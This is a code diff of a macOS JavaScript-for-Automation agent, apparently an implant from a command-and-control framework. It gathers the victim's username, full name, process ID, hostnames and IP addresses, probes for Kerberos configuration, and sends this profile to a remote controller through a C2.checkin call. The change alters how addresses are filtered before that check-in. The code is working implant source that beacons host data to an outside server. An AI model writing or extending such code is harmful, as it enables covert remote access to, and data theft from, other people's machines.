@@ -14,7 +14,7 @@ class agent{
 		this.user = ObjC.deepUnwrap(this.procInfo.userName);
 		this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
 		//every element in the array needs to be unwrapped
-		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses); //probably just need [0]
+		this.ip = ObjC.deepUnwrap(this.hostInfo.addresses).sort().filter(i => i !== "127.0.0.1"); //probably just need [0]
 		this.pid = this.procInfo.processIdentifier;
 		//every element in the array needs to be unwrapped
 		this.host = ObjC.deepUnwrap(this.hostInfo.names); //probably just need [0]
@@ -145,17 +145,7 @@ if(does_file_exist("/etc/krb5.conf")){
         }
     }
 }
-for(let i=0; i < apfell.ip.length; i++){
-	let ip = apfell.ip[i];
-	if (ip.includes(".") && ip !== "127.0.0.1"){ // the includes(".") is to make sure we're looking at IPv4
-		C2.checkin(ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
-		ip_found = true;
-		break;
-	}
-}
-if(!ip_found){
-    C2.checkin("127.0.0.1",apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
-}
+C2.checkin(apfell.ip,apfell.pid,apfell.user,ObjC.unwrap(apfell.procInfo.hostName),apfell.osVersion, "x64", domain);
 //---------------------------MAIN LOOP ----------------------------------------
 function sleepWakeUp(){
     while(true){
